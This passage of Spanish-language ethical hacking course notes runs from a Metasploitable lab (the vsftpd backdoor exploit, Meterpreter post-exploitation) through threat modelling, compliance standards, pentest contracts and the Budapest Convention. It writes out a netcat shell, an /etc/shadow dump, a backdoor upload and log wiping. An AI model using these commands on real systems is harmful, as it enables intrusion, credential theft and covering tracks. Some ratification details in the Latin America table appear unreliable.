üîó [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

1. Descarga el archivo `.zip`
2. Extrae el contenido
3. Abre el `.vmdk` con **VirtualBox** o **VMware**

---

#### ‚öôÔ∏è 2. Configura la red en ambas m√°quinas

En VirtualBox (para Kali y Metasploitable):

> **Configuraci√≥n > Red > Adaptador 1 > Modo:** `Red interna` (o `Adaptador puente`)

Esto asegura que puedan verse entre ellas por IP.

---

#### üåê 3. Obt√©n las IPs

En **Kali**:

```bash
ip a
```

En **Metasploitable**:

```bash
ifconfig
```

Ejemplo:

- Kali: `192.168.56.101`
- Metasploitable: `192.168.56.102`

---

#### üîé FASE 1: Escaneo con Nmap

Desde Kali, descubre servicios abiertos en Metasploitable:

```bash
nmap -sS -sV -O 192.168.56.102
```

Esto te dir√°:

- Qu√© puertos est√°n abiertos
- Qu√© servicios corren (FTP, SSH, Apache, MySQL, etc.)
- Qu√© versi√≥n de SO est√° usando

Ejemplo de salida:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1
23/tcp   open  telnet
80/tcp   open  http    Apache 2.2.8
```

---

#### ‚öîÔ∏è FASE 2: Ataque con Metasploit

##### Paso 1: Inicia Metasploit

```bash
msfconsole
```

---

##### Paso 2: Buscar exploit para `vsftpd 2.3.4` (FTP con backdoor)

```bash
search vsftpd
```

Ver√°s algo como:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

##### Paso 3: Selecciona y configura el exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run
```

---

#### üî• Resultado esperado:

```bash
[*] Backdoor service has been spawned, handling...
[*] Command shell session 1 opened
```

¬°Has conseguido una **shell remota** en la m√°quina v√≠ctima! üòé

---

### ‚úÖ Qu√© puedes hacer ahora

Dentro de la shell puedes ejecutar comandos como:

```bash
whoami
uname -a
ls /home
```

---

### üß™ OTROS SERVICIOS QUE PUEDES EXPLOTAR

| Servicio               | Vulnerabilidad       | Exploit                              |
| ---------------------- | -------------------- | ------------------------------------ |
| Telnet (`port 23`)     | Sesi√≥n sin login     | Manual                               |
| Samba (`port 139/445`) | Samba usermap script | `exploit/multi/samba/usermap_script` |
| Apache (`port 80`)     | WebDAV, PHP, etc.    | M√∫ltiples                            |
| MySQL (`port 3306`)    | Default credentials  | Manual / Hydra                       |

---

### üßº ¬øC√≥mo protegerse?

Metasploitable NO DEBE estar en una red real. Pero en sistemas reales, estas son buenas pr√°cticas:

‚úÖ Actualiza servicios desactualizados (como vsftpd 2.3.4)

‚úÖ Desactiva puertos innecesarios

‚úÖ Usa firewalls y autenticaci√≥n fuerte

‚úÖ Haz escaneos peri√≥dicos con Nmap o Nessus

---

### üß† CONCLUSIONES

üîπ Metasploitable es ideal para aprender explotaci√≥n real

üîπ Se combina perfectamente con Kali y Metasploit

üîπ No necesitas da√±ar ning√∫n servidor para practicar

üîπ ¬°La mejor forma de aprender es **romper cosas en laboratorio**!

---

[üîº](#√≠ndice)

---

## **878. Fase Post-ataque. Metodolog√≠as**

### üß† ¬øQu√© es la Fase Post-Ataque?

Es la etapa que **ocurre despu√©s de haber explotado una vulnerabilidad** y obtener acceso a una m√°quina o red. En esta fase no se trata solo de entrar, sino de:

#### üéØ Objetivos clave:

- Mantener el acceso (persistencia)
- Escalar privilegios
- Movilidad lateral (acceder a otras m√°quinas)
- Exfiltrar informaci√≥n
- Cubrir huellas (limpiar logs)
- Documentar todo

> üéì Esta fase se parece m√°s al trabajo de un esp√≠a digital que al de un hacker tradicional. No se rompe todo: **se analiza, se documenta y se asegura la permanencia para investigar m√°s**.

---

### üß∞ Herramientas m√°s usadas en post-explotaci√≥n

| Herramienta   | ¬øPara qu√© sirve?                              |
| ------------- | --------------------------------------------- |
| `Meterpreter` | Shell avanzada post-exploit de Metasploit     |
| `Mimikatz`    | Robar contrase√±as y hashes en Windows         |
| `Empire`      | Framework de post-exploitation en PowerShell  |
| `BloodHound`  | Analizar Active Directory                     |
| `Netcat`      | Crear backdoors y tunelizaci√≥n                |
| `SSH/Plink`   | Mantener conexi√≥n con la m√°quina comprometida |

---

### üîß ¬øC√≥mo se instala el entorno?

Ya que estamos en la **fase post**, asumimos que ya tienes:

1. ‚úÖ Una m√°quina atacante (Kali Linux)
2. ‚úÖ Una m√°quina v√≠ctima (Metasploitable o Windows vulnerable)
3. ‚úÖ Acceso a la v√≠ctima (por ejemplo, mediante Metasploit)

---

### üîå CONFIGURACI√ìN B√ÅSICA DE PRUEBA

#### Paso 1: Iniciar Metasploit

```bash
msfconsole
```

#### Paso 2: Usar un exploit para conseguir acceso (como vsftpd)

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run
```

üéØ Una vez adentro, cambiar√°s a **Meterpreter**, una shell con muchas herramientas post-exploit.

---

### üß™ EJEMPLO COMPLETO: POST-EXPLOITACI√ìN CON METERPRETER

#### üìç Escenario:

Ya explotaste un servicio y tienes una sesi√≥n de Meterpreter abierta.

---

#### ‚úÖ 1. Enumerar informaci√≥n del sistema

```bash
sysinfo
```

Salida:

```
Computer: metasploitable
OS: Linux 2.6.24
Arch: x86
```

---

#### ‚úÖ 2. Obtener usuarios conectados

```bash
getuid
```

```bash
id
```

---

#### ‚úÖ 3. Buscar archivos interesantes

```bash
search -f *.conf
```

O buscar contrase√±as directamente:

```bash
cat /etc/passwd
cat /etc/shadow
```

---

#### ‚úÖ 4. Subir o descargar archivos

```bash
upload backdoor.sh /tmp
download /etc/passwd
```

---

#### ‚úÖ 5. Mantener acceso: backdoor (Netcat)

En la v√≠ctima:

```bash
nc -lvp 4444 -e /bin/bash
```

En Kali:

```bash
nc 192.168.56.102 4444
```

Esto crea una **shell inversa** manual.

---

#### ‚úÖ 6. Escalar privilegios

Usa el m√≥dulo de `local_exploit_suggester` de Metasploit:

```bash
run post/multi/recon/local_exploit_suggester
```

Te recomendar√° exploits para elevar de usuario normal a root.

---

### üìò METODOLOG√çAS EN POST-EXPLOITACI√ìN

Las siguientes metodolog√≠as gu√≠an el trabajo profesional del pentester tras el acceso:

| Metodolog√≠a             | Objetivo principal                                                    |
| ----------------------- | --------------------------------------------------------------------- |
| **PTES**                | Estandarizar post-exploit en pentesting                               |
| **MITRE ATT\&CK**       | T√°cticas y t√©cnicas reales de APTs (persistencia, exfiltraci√≥n, etc.) |
| **OWASP Testing Guide** | Enfocado en aplicaciones web, incluye acciones post                   |

#### Ejemplo con MITRE ATT\&CK:

- **TA0003 ‚Äì Persistencia:** A√±adir un servicio al inicio en Linux.
- **TA0005 ‚Äì Defensa evasiva:** Borrar logs (`rm -f /var/log/auth.log`)
- **TA0006 ‚Äì Credenciales:** Dump de `/etc/shadow` o `mimikatz` en Windows.
- **TA0007 ‚Äì Descubrimiento:** Enumerar interfaces, usuarios, etc.
- **TA0008 ‚Äì Movimiento lateral:** Con SSH, RDP, etc.

---

#### üßº 7. Cubrir huellas (¬°s√≥lo en laboratorio!)

```bash
rm -f /var/log/auth.log
history -c
```

> ‚ö†Ô∏è ¬°Nunca lo hagas fuera de un entorno controlado o sin permiso legal!

---

### ‚úÖ RESUMEN DE PASOS (checklist)

‚úÖ Acceso inicial a la m√°quina

‚úÖ Enumeraci√≥n de usuarios, sistema y redes

‚úÖ Extracci√≥n de credenciales o archivos sensibles

‚úÖ Escalado de privilegios

‚úÖ Persistencia (backdoor o cronjob)

‚úÖ Movimiento lateral (si hay m√°s m√°quinas)

‚úÖ Documentar todo para el informe final

---

### üîê ¬øC√≥mo prevenir la post-explotaci√≥n?

- Uso de firewalls y antivirus
- No usar contrase√±as por defecto
- Monitorear actividad de red y sistema
- Actualizar software
- Detecci√≥n de anomal√≠as (SIEM)

---

### üìå CONCLUSI√ìN

üîπ Esta fase es donde el **hacking √©tico se vuelve m√°s estrat√©gico**
üîπ El pentester ya no solo ataca, ahora **analiza, permanece y se mueve**
üîπ Las herramientas como `Meterpreter`, `Mimikatz` y `Empire` son clave
üîπ Se usan marcos profesionales como **MITRE ATT\&CK** y **PTES**

---

[üîº](#√≠ndice)

---

## **879. Gesti√≥n de riesgos y modelado de amenazas**

### üß† ¬øQu√© es la Gesti√≥n de Riesgos?

Es el proceso de identificar, analizar y **mitigar los riesgos** que amenazan la seguridad de los activos (datos, redes, software, etc.) de una organizaci√≥n.

#### üß© ¬øQu√© es un Riesgo?

Un riesgo en ciberseguridad es la **combinaci√≥n de una vulnerabilidad explotable y una amenaza real** que puede causar da√±o.

> üîí **Riesgo = Vulnerabilidad + Amenaza + Impacto**

---

### üîç ¬øQu√© es el Modelado de Amenazas?

Es una **t√©cnica de an√°lisis proactivo** para encontrar posibles amenazas **antes de que un atacante lo haga**. Sirve para responder preguntas como:

- ¬øQu√© podr√≠a salir mal?
- ¬øQu√© atacantes pueden estar interesados?
- ¬øQu√© controles debo aplicar?

---

### üìã Etapas de la Gesti√≥n de Riesgos

| Etapa                 | Descripci√≥n                                      |
| --------------------- | ------------------------------------------------ |
| **1. Identificaci√≥n** | Identificar activos, amenazas y vulnerabilidades |
| **2. Evaluaci√≥n**     | Evaluar impacto y probabilidad                   |
| **3. Tratamiento**    | Decidir: Mitigar, Transferir, Aceptar o Evitar   |
| **4. Monitoreo**      | Revisi√≥n y mejora continua                       |

---

### ‚ö†Ô∏è Ejemplo Simple de Riesgo

| Elemento       | Valor                                   |
| -------------- | --------------------------------------- |
| Activo         | Base de datos de clientes               |
| Vulnerabilidad | Contrase√±a d√©bil en MySQL               |
| Amenaza        | Ataque de fuerza bruta                  |
| Impacto        | P√©rdida de datos + multa por privacidad |
| Riesgo         | Alto                                    |

---

### üß† M√©todos para el Modelado de Amenazas

#### 1. **STRIDE** (modelo de Microsoft)

| Letra | Amenaza                    | Ejemplo                              |
| ----- | -------------------------- | ------------------------------------ |
| S     | **Spoofing**               | Suplantaci√≥n de identidad            |
| T     | **Tampering**              | Modificaci√≥n de datos                |
| R     | **Repudiation**            | Negaci√≥n de acciones                 |
| I     | **Information Disclosure** | Fuga de datos sensibles              |
| D     | **Denial of Service**      | Ca√≠da del sistema                    |
| E     | **Elevation of Privilege** | Subir de usuario normal a root/admin |

---

#### 2. **DREAD** (m√©todo para priorizar riesgos)

| Factor          | Descripci√≥n                                    |
| --------------- | ---------------------------------------------- |
| Damage          | ¬øQu√© tanto da√±o puede causar?                  |
| Reproducibility | ¬øQu√© tan f√°cil es repetir el ataque?           |
| Exploitability  | ¬øQu√© tan f√°cil es explotar la amenaza?         |
| Affected Users  | ¬øA cu√°ntos usuarios afecta?                    |
| Discoverability | ¬øQu√© tan f√°cil es encontrar la vulnerabilidad? |

Cada factor se punt√∫a de 1 a 10, se suman y se prioriza el riesgo.

---

### üß∞ Herramientas de Modelado de Amenazas

#### ‚úÖ 1. **Microsoft Threat Modeling Tool** (Gratis)

- Aplicaci√≥n para modelar amenazas usando STRIDE
- Genera autom√°ticamente amenazas seg√∫n tu arquitectura

üîó [Descarga](https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling)

---

#### ‚úÖ 2. **OWASP Threat Dragon**

- Herramienta open source multiplataforma
- Puedes usarla online o instalarla

üîó [Sitio oficial](https://owasp.org/www-project-threat-dragon/)

---

### üñ•Ô∏è Instalaci√≥n r√°pida de OWASP Threat Dragon (modo local)

#### Requisitos:

- Node.js instalado

```bash
npm install -g @owasp/threat-dragon
threatdragon
```

Abre en tu navegador:
üëâ `http://localhost:8080`

---

### ‚úÖ EJEMPLO COMPLETO

#### üß™ Escenario: Aplicaci√≥n web de e-commerce

Tu aplicaci√≥n tiene:

- Inicio de sesi√≥n
- P√°gina de productos
- Carrito de compras
- Pago con tarjeta

#### ‚öôÔ∏è Paso 1: Crear modelo en Threat Dragon o papel

Dibuja los siguientes elementos:

- Usuario
- Navegador
- Servidor Web
- Base de datos
- Servicio de pagos externo

#### ‚ö†Ô∏è Paso 2: Identificar amenazas con STRIDE

| Componente       | Amenaza                    | Tipo (STRIDE)          |
| ---------------- | -------------------------- | ---------------------- |
| Inicio de sesi√≥n | Suplantaci√≥n (login falso) | Spoofing               |
| Carrito          | Modificaci√≥n de precios    | Tampering              |
| Transacci√≥n      | Fuga de tarjeta            | Information Disclosure |
| Web App          | DDoS                       | Denial of Service      |
| DB               | Inyecci√≥n SQL              | Elevation of Privilege |

---

#### üìä Paso 3: Calificar con DREAD

| Amenaza                 | DREAD Score                 |
| ----------------------- | --------------------------- |
| Inyecci√≥n SQL           | 9 + 9 + 10 + 9 + 8 = **45** |
| Modificaci√≥n de precios | 6 + 7 + 8 + 6 + 5 = **32**  |
| Suplantaci√≥n de login   | 5 + 6 + 5 + 6 + 4 = **26**  |

üî¥ **Prioridad alta:** Inyecci√≥n SQL

üü° **Prioridad media:** Manipulaci√≥n de precios

üü¢ **Prioridad baja:** Spoofing de login

---

#### üõ°Ô∏è Paso 4: Tomar decisiones

- Aplicar **validaci√≥n de entradas** para evitar SQLi
- Usar HTTPS en toda la app
- Limitar intentos de login
- Activar monitoreo con SIEM o alertas

---

### üßæ CONCLUSI√ìN

- **La gesti√≥n de riesgos** ayuda a entender qu√© proteger y c√≥mo.
- **El modelado de amenazas** es una t√©cnica para identificar problemas antes de que ocurra un ataque.
- STRIDE y DREAD son m√©todos simples pero poderosos.
- Herramientas como **Threat Modeling Tool** o **Threat Dragon** facilitan mucho el trabajo.
- La gesti√≥n y modelado **no es solo para expertos**, sino para **todo desarrollador o pentester profesional**.

---

[üîº](#√≠ndice)

---

## **880. PCI DSS. HIPAA. DMCA.ISO/IEC 27001**

### üì¶ 1. ¬øQu√© es PCI DSS?

#### üîê Significa: _Payment Card Industry Data Security Standard_

Es un **est√°ndar de seguridad obligatorio** para toda empresa que **almacene, procese o transmita datos de tarjetas de cr√©dito**.

#### ‚úÖ Objetivo:

Proteger los datos de tarjetas de d√©bito/cr√©dito y evitar fraudes.

#### üìã Requisitos clave (ejemplos):

| Requisito                    | Ejemplo Pr√°ctico                            |
| ---------------------------- | ------------------------------------------- |
| Usar firewall                | Instalar `iptables` o `ufw`                 |
| Cifrar transmisi√≥n de datos  | Forzar HTTPS                                |
| Usar contrase√±as seguras     | Bloquear accesos con autenticaci√≥n fuerte   |
| Monitorear accesos y alertas | Usar herramientas como **Snort** o **SIEM** |

---

### üß¨ 2. ¬øQu√© es HIPAA?

#### üë©‚Äç‚öïÔ∏è Significa: _Health Insurance Portability and Accountability Act_ (EE.UU.)

Es una ley que protege la **informaci√≥n m√©dica personal (PHI)**.

#### ‚úÖ Objetivo:

Evitar que informaci√≥n m√©dica (ex√°menes, diagn√≥sticos, tratamientos) se exponga o se use indebidamente.

#### üìã Ejemplos:

| Acci√≥n Permitida por HIPAA            | Acci√≥n Prohibida                            |
| ------------------------------------- | ------------------------------------------- |
| Acceder al historial con autorizaci√≥n | Compartir historial sin permiso             |
| Usar cifrado para enviar ex√°menes     | Enviar resultados m√©dicos por correo simple |

#### üõ† Herramientas √∫tiles:

- Cifrado de discos (como **VeraCrypt**)
- VPN y t√∫neles seguros
- Control de acceso con **LDAP** o **Active Directory**

---

### üìÑ 3. ¬øQu√© es DMCA?

#### üìö Significa: _Digital Millennium Copyright Act_

Es una ley de derechos de autor de EE.UU. aplicada en entornos digitales.

#### ‚úÖ Objetivo:

Proteger **contenidos digitales con derechos de autor**, incluyendo software, libros, m√∫sica, im√°genes.

#### üìã Ejemplos comunes:

| Permitido (Fair Use)                        | Prohibido (Violaci√≥n de DMCA)     |
| ------------------------------------------- | --------------------------------- |
| Usar fragmentos breves con fines educativos | Subir software crackeado a GitHub |
| Parodiar un video con derechos              | Descargar m√∫sica sin licencia     |

> üí° GitHub, YouTube y Google **bloquean contenido** por infracci√≥n DMCA.

---

### üåê 4. ¬øQu√© es ISO/IEC 27001?

#### üõ°Ô∏è Es un est√°ndar internacional de **gesti√≥n de seguridad de la informaci√≥n** (ISMS).

#### ‚úÖ Objetivo:

Establecer procesos, controles y auditor√≠as para proteger la **confidencialidad, integridad y disponibilidad** de la informaci√≥n.

#### üß© Clave del est√°ndar:

No solo es t√©cnico, tambi√©n es organizacional.

#### üìã Ejemplos:

| Requisito de ISO 27001              | Ejemplo                                    |
| ----------------------------------- | ------------------------------------------ |
| Control de acceso                   | Cada empleado tiene usuario y clave √∫nicos |
| Respaldo de informaci√≥n             | Backups diarios autom√°ticos                |
| Pol√≠ticas de seguridad documentadas | Manual de pol√≠ticas de seguridad digital   |

---

### üñ•Ô∏è ¬øC√≥mo se ‚Äúinstala‚Äù o aplica cada uno?

Estas normas **no se instalan como software**, pero se pueden implementar usando herramientas y pr√°cticas espec√≠ficas. Aqu√≠ te doy una idea para cada una:

#### üîß PCI DSS

- Instala un firewall (`ufw` en Linux):

```bash
sudo apt install ufw
sudo ufw enable
sudo ufw allow 443/tcp
```

- Fuerza HTTPS con **Let's Encrypt** y Nginx

#### üîß HIPAA

- Usa cifrado de disco con **VeraCrypt** o **BitLocker**
- Usa autenticaci√≥n con doble factor

#### üîß ISO/IEC 27001

- Crea una **pol√≠tica de seguridad**
- Usa **Open-AudIT** o **GLPI** para inventario de activos
- Herramientas SIEM como Wazuh, Splunk o ELK para monitoreo

#### üîß DMCA

- Verifica c√≥digo o contenido antes de publicarlo
- Si usas contenido de terceros, ten **licencias** o usa contenido libre como en [creativecommons.org](https://creativecommons.org)

---

### ‚úÖ EJEMPLO COMPLETO: Aplicaci√≥n web que cumple PCI DSS e ISO/IEC 27001

#### Escenario:

Est√°s desarrollando una tienda online que acepta pagos con tarjeta.

#### Paso 1: Cumplimiento de PCI DSS

| Acci√≥n                     | Ejecuci√≥n pr√°ctica                         |
| -------------------------- | ------------------------------------------ |
| Usar HTTPS                 | Certificado con Let‚Äôs Encrypt y Nginx      |
| No guardar tarjetas        | Usar Stripe o PayPal como pasarela externa |
| Cifrado de datos sensibles | Usar `bcrypt` para contrase√±as             |
| Monitorear tr√°fico         | Instalar **Snort** para IDS                |

#### Paso 2: Cumplimiento ISO/IEC 27001

| Acci√≥n                | Ejecuci√≥n pr√°ctica                         |
| --------------------- | ------------------------------------------ |
| Control de acceso     | Roles definidos: admin, usuario, visitante |
| Gesti√≥n de incidentes | Logs centralizados con Wazuh o SIEM        |
| Respaldos             | Automatizados con cron y `rsync`           |
| Documentaci√≥n         | Manual de pol√≠ticas (PDF, wiki, etc.)      |

---

### üß† CONCLUSI√ìN

| Norma         | Enfocada en...                        | Principal uso                        |
| ------------- | ------------------------------------- | ------------------------------------ |
| **PCI DSS**   | Tarjetas de cr√©dito                   | E-commerce, bancos, sistemas de pago |
| **HIPAA**     | Informaci√≥n m√©dica                    | Cl√≠nicas, hospitales, apps m√©dicas   |
| **DMCA**      | Derechos de autor en medios digitales | Plataformas online, GitHub, YouTube  |
| **ISO 27001** | Seguridad general de la informaci√≥n   | Empresas que manejan datos sensibles |

---

[üîº](#√≠ndice)

---

## **881. Contratos, Reglas de compromisos, Cl√°usula de no competencia y Acuerdo de confidencialidad**

### üßæ 1. CONTRATOS EN HACKING √âTICO

#### üîç ¬øQu√© es?

Un **contrato** es un documento legal firmado entre el **hacker √©tico (pentester)** y la **empresa o cliente** que solicita el servicio. Establece claramente **lo que se va a hacer**, **cu√°ndo**, **c√≥mo**, y **con qu√© limitaciones**.

#### üß† ¬øPor qu√© es importante?

Sin un contrato, realizar un test de penetraci√≥n (pentest) puede considerarse **ilegal**. El contrato **protege legalmente** a ambas partes.

#### üìã Qu√© debe incluir:

- Identificaci√≥n de las partes
- Tipo de pruebas autorizadas (red, web, Wi-Fi, etc.)
- Duraci√≥n del trabajo
- Honorarios
- Responsabilidades
- Cl√°usulas legales (confidencialidad, competencia, etc.)

#### üß† Ejemplo sencillo:

> ‚ÄúEl pentester podr√° ejecutar pruebas de intrusi√≥n en la web `tiendaonline.com` entre el 1 y el 5 de agosto, sin afectar a clientes reales, y usando herramientas aprobadas como Nmap y Burp Suite.‚Äù

---

### ‚öîÔ∏è 2. REGLAS DE COMPROMISO (ROE ‚Äì Rules of Engagement)

#### üîç ¬øQu√© es?

Es un **anexo t√©cnico al contrato**. Define los **l√≠mites, alcance y m√©todos** que el hacker √©tico puede usar durante el pentest.

#### üìã Contiene:

- ¬øQu√© sistemas se pueden atacar?
- ¬øCu√°ndo se pueden hacer las pruebas?
- ¬øQu√© t√©cnicas est√°n permitidas?
- ¬øQu√© hacer si se encuentra informaci√≥n sensible?
- ¬øQu√© hacer en caso de ca√≠da del sistema?

#### üß† Ejemplo:

> ‚ÄúEl pentester no podr√° realizar ataques de denegaci√≥n de servicio (DoS). El escaneo se har√° solo entre las 2:00 am y las 4:00 am. Si encuentra credenciales de usuarios reales, deber√° reportarlas inmediatamente y no usarlas.‚Äù

---

### üö´ 3. CL√ÅUSULA DE NO COMPETENCIA

#### üîç ¬øQu√© es?

Es una cl√°usula que proh√≠be al hacker √©tico **trabajar con empresas rivales del cliente** durante o despu√©s del contrato, por un tiempo limitado.

#### üìã ¬øPor qu√© se usa?

Para evitar que un hacker √©tico use conocimientos adquiridos con un cliente para beneficiar a su competencia.

#### üß† Ejemplo simple:

> ‚ÄúEl consultor no podr√° prestar servicios de seguridad a empresas competidoras de ClienteX durante un per√≠odo de 12 meses despu√©s de finalizado el contrato.‚Äù

---

### ü§ê 4. ACUERDO DE CONFIDENCIALIDAD (NDA ‚Äì Non-Disclosure Agreement)

#### üîç ¬øQu√© es?

Es un documento que impide al hacker √©tico revelar informaci√≥n confidencial del cliente, como:

- Sistemas internos
- Vulnerabilidades encontradas
- Datos de clientes o empleados
- Planes o estrategias de seguridad

### üß† Ejemplo:

> ‚ÄúEl firmante se compromete a no divulgar, publicar ni utilizar para fines personales ninguna informaci√≥n t√©cnica, estrat√©gica ni comercial obtenida durante el contrato.‚Äù

> üîê ¬°Un NDA protege legalmente la **privacidad de la empresa** y la **integridad del pentester**!

---

### üì• ¬øC√ìMO SE "INSTALA" ESTO?

No se ‚Äúinstala‚Äù como software, pero s√≠ se **implementa como parte del proceso profesional**:

#### Paso a paso para implementar correctamente:

1. **Plantillas**: Crea o descarga plantillas de contrato, NDA y cl√°usulas.
2. **Adaptaci√≥n**: Personal√≠zalas para cada cliente (nombre, fechas, alcance).
3. **Firma**: Usa firma digital con herramientas como:

   - [DocuSign](https://www.docusign.com/)
   - [Adobe Sign](https://acrobat.adobe.com/us/en/sign.html)
   - PDF con firma manuscrita escaneada

4. **Archivo seguro**: Guarda los documentos en sistemas cifrados o controlados.

---

### ‚úÖ EJEMPLO COMPLETO

Sup√≥n que **Gustavo** es un pentester freelance. Lo contrata la empresa **CyberMarket S.A.C.**, para hacer una evaluaci√≥n de seguridad en su plataforma e-commerce.

#### üîê Documentos firmados:

##### 1. Contrato:

- Pruebas autorizadas en `https://www.cybermarket.com`
- Duraci√≥n: del 1 al 7 de agosto
- Herramientas: Burp Suite, Nmap, Nikto
- Precio: S/. 1500 por el servicio
- Entrega de reporte t√©cnico y ejecutivo

##### 2. Reglas de compromiso (ROE):

- No se permiten ataques DoS o DDoS
- Escaneo solo entre 12:00 a.m. y 4:00 a.m.
- Se debe avisar si se encuentran datos sensibles

##### 3. Cl√°usula de no competencia:

- Gustavo no puede trabajar con **TiendaZ**, competencia directa, por 1 a√±o

##### 4. NDA:

- Gustavo no podr√° divulgar ninguna informaci√≥n t√©cnica ni comercial encontrada, ni en redes ni en su portafolio

---

### üéØ CONCLUSI√ìN R√ÅPIDA

| Elemento                | ¬øPara qu√© sirve?               | ¬øC√≥mo lo implemento?                         |
| ----------------------- | ------------------------------ | -------------------------------------------- |
| **Contrato**            | Legalizar el trabajo           | Firma f√≠sica o digital                       |
| **Rules of Engagement** | Limitar el alcance del pentest | Documento t√©cnico anexo al contrato          |
| **No competencia**      | Evitar conflicto de intereses  | Cl√°usula en el contrato                      |
| **NDA**                 | Mantener la confidencialidad   | Documento por separado o dentro del contrato |

---

[üîº](#√≠ndice)

---

## **882. Convenio de Budapest. ¬øC√≥mo vamos en Am√©rica latina? Salvaguarda de evidencias digitales**

### üèõÔ∏è 1. ¬øQu√© es el CONVENIO DE BUDAPEST?

#### üîç Definici√≥n:

El **Convenio de Budapest**, tambi√©n conocido como el **Convenio sobre la Ciberdelincuencia**, es el **primer tratado internacional** que busca hacer frente a los **delitos inform√°ticos** mediante:

- Una legislaci√≥n penal com√∫n entre pa√≠ses
- Procedimientos de investigaci√≥n compatibles
- Cooperaci√≥n internacional r√°pida y efectiva

üìÖ Fue adoptado el **23 de noviembre de 2001** en Budapest, Hungr√≠a, y entr√≥ en vigor en 2004.

üîí **Organizado por**: el Consejo de Europa (pero abierto a todos los pa√≠ses, incluso no europeos).

---

#### üß† ¬øQu√© delitos aborda?

Incluye **delitos como**:

| Tipo de delito                     | Ejemplo                                            |
| ---------------------------------- | -------------------------------------------------- |
| Acceso ilegal                      | Hackear una cuenta o sistema sin permiso           |
| Interceptaci√≥n ilegal              | Escuchar comunicaciones sin autorizaci√≥n           |
| Da√±os a sistemas o datos           | Borrar bases de datos o lanzar un ransomware       |
| Fraude inform√°tico                 | Suplantaci√≥n de identidad o phishing bancario      |
| Distribuci√≥n de malware            | Crear o vender virus o troyanos                    |
| Delitos relacionados con contenido | Distribuir pornograf√≠a infantil o contenido ilegal |
| Infracciones de derechos de autor  | Pirater√≠a digital                                  |

---

### üåé 2. ¬øC√≥mo vamos en Am√©rica Latina?

#### üá™üá∫ ¬øEs obligatorio firmarlo?

No. Cada pa√≠s **decide si lo firma y lo ratifica**. Solo entonces se compromete legalmente a cumplirlo.

#### üìä Situaci√≥n actual (Am√©rica Latina):

| Pa√≠s                       | Estado actual respecto al Convenio de Budapest                    |
| -------------------------- | ----------------------------------------------------------------- |
| **Chile**                  | ‚úÖ Miembro pleno (ratificado en 2017)                             |
| **Colombia**               | ‚úÖ Miembro pleno (ratificado en 2021)                             |
| **Costa Rica**             | ‚úÖ Miembro pleno (ratificado en 2017)                             |
| **Rep. Dominicana**        | ‚úÖ Miembro pleno (ratificado en 2013)                             |
| **Argentina**              | üïí Invitado a firmar, pero a√∫n sin ratificar                      |
| **Per√∫**                   | ‚ùå No ha firmado ni ratificado                                    |
| **M√©xico**                 | üïí Invitado a firmar, pero sin ratificaci√≥n                       |
| **Brasil**                 | ‚ùå No es parte, pero tiene leyes propias contra delitos digitales |
| **Ecuador, Bolivia, etc.** | ‚ùå No miembros a√∫n                                                |

üîé **Conclusi√≥n**: En Am√©rica Latina, **solo unos pocos pa√≠ses lo han ratificado**. Otros est√°n en proceso o a√∫n no han mostrado avances significativos.

---

### üßæ 3. ¬øQu√© es la SALVAGUARDA DE EVIDENCIAS DIGITALES?

#### üîê Definici√≥n:

La **salvaguarda de evidencias digitales** es el proceso de **identificar, preservar, recopilar y analizar** datos electr√≥nicos **sin alterarlos**, para que puedan usarse como prueba **en una investigaci√≥n o juicio**.

---

#### üß∞ ¬øC√≥mo se hace?

| Etapa                 | Descripci√≥n                                                                   |
| --------------------- | ----------------------------------------------------------------------------- |
| **1. Identificaci√≥n** | Encontrar el dispositivo o sistema relevante (servidor, disco, celular...)    |
| **2. Preservaci√≥n**   | Protegerlo de modificaciones (desconectar de red, hacer imagen forense)       |
| **3. Adquisici√≥n**    | Clonar los datos (ej. con herramientas como `dd`, FTK Imager, Autopsy)        |
| **4. An√°lisis**       | Buscar evidencia relevante (IP, logs, mensajes, archivos eliminados)          |
| **5. Documentaci√≥n**  | Registrar **paso a paso todo lo hecho**, para asegurar **cadena de custodia** |

üõ°Ô∏è **Cadena de custodia**: documento donde se registra **qui√©n tuvo acceso a la evidencia, cu√°ndo y para qu√©**, para garantizar que no fue manipulada.

---

### üß† Ejemplo pr√°ctico sencillo

#### Escenario:

La empresa **‚ÄúRedSegura S.A.C.‚Äù** sufri√≥ una intrusi√≥n. El hacker rob√≥ informaci√≥n del servidor web.

El equipo de respuesta quiere conservar evidencia para denunciar y posiblemente usarla en juicio.

#### üîç Paso a paso:

1. **Identificaci√≥n**:
   Se detecta que el servidor `192.168.1.15` fue comprometido.

2. **Preservaci√≥n**:
   Se desconecta el servidor de internet. Se hace una imagen forense del disco con el comando:

   ```bash
   dd if=/dev/sda of=/mnt/disco_evidencia/redsegura_sda.img bs=4M
   ```

3. **Adquisici√≥n y an√°lisis**:
   Se analiza la imagen con **Autopsy** y se detecta:

   - Archivos maliciosos con shells
   - Logs con IPs de conexi√≥n sospechosas
   - Cuentas de usuario creadas sin permiso

4. **Documentaci√≥n**:
   Todo queda registrado:

   - Herramientas usadas
   - Fechas y horarios
   - Acciones realizadas
   - Firma del analista

5. **Entrega a autoridades**:
   Se firma un **acta de cadena de custodia** y se entrega la evidencia al fiscal de delitos inform√°ticos.

---

### üìå Conclusi√≥n clave

| Concepto                     | Clave para entender                                                         |
| ---------------------------- | --------------------------------------------------------------------------- |
| **Convenio de Budapest**     | Marco legal internacional contra ciberdelitos. Am√©rica Latina avanza lento. |
| **Salvaguarda de evidencia** | Proteger pruebas digitales sin alterar su integridad.                       |
| **Importancia**              | Sin buenas pr√°cticas, no se puede castigar legalmente al atacante           |

---

[üîº](#√≠ndice)

---

## **883. Malware y An√°lisis est√°tico de malware**

### ü¶† ¬øQu√© es el MALWARE?

**Malware** es una palabra compuesta de ‚Äúmalicious software‚Äù (software malicioso). Son **programas dise√±ados para da√±ar, infiltrarse o robar informaci√≥n** sin el consentimiento del usuario.

---

#### üß¨ Tipos comunes de malware:

| Tipo           | Qu√© hace                                                        | Ejemplo f√°cil                               |
| -------------- | --------------------------------------------------------------- | ------------------------------------------- |
| **Virus**      | Infecta otros archivos ejecutables                              | Se copia a Word.exe                         |
